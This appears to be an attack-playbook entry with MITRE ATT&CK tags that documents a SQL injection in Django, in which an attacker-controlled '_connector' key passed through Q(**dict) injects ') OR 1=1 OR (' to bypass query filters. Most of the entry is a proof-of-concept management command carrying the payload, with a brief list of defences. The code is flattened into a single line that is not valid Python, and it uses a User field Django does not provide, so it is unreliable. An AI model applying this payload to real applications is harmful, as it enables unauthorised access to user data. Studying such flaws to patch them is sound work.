---
id: p4d5e6f7-g8h9-0123-defg-456789012345
name: Implement-Vulnerable-POC-Code
tags:
  - sqli
  - poc
  - q-objects
  - django
type: procedure
tools:
  - '[[tools/manage-py]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Python
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:19.973Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Implement-Vulnerable-POC-Code

## Summary

Develops a custom management command that simulates the vulnerable code path, injecting SQL via '_connector' to bypass filters.

## Description

The core vulnerability is in WhereNode.as_sql, where self.connector is unsafely formatted into SQL. By unpacking a user-controlled dict into Q(**dict), attackers set '_connector' to ') OR 1=1 OR (', altering the WHERE clause. This POC creates users, applies the payload, and shows bypass.

## Requirements

1. Django project with app configured
2. Management structure in place
3. Knowledge of Django ORM and Q objects

## Defense

Defensive measures and detection strategies:

- Validate and sanitize inputs before Q unpacking
- Use explicit Q object construction instead of **kwargs
- Monitor SQL queries for anomalies

## Objectives

1. Simulate vulnerable filter application
2. Inject and execute malicious connector
3. Demonstrate data exfiltration

## Instructions

### Step 1: Write POC Script

**Context**: Implement the command class in poc.py.

**Command** (Manual Code Edit):
No command; edit webapp/management/commands/poc.py.

> from django.core.management.base import BaseCommand; from django.contrib.auth.models import User; from django.db.models import Q; class Command(BaseCommand): def handle(self, *args, **options): User.objects.create(username='admin', is_admin=True); User.objects.create(username='user', is_admin=False); search_dict = {'is_admin': False, 'username': 'nonexistent_user', '_connector': ') OR 1=1 OR ('}; query = Q(**search_dict); users = User.objects.filter(query); print(users.query.as_sql()[0]); for u in users: print(u.username, u.is_admin); self.stdout.write(self.style.SUCCESS('SUCCESS: The filter was bypassed')). Expected output: Script ready for execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/manage-py]]

## Tags

- sqli
- poc
- q-objects
- django
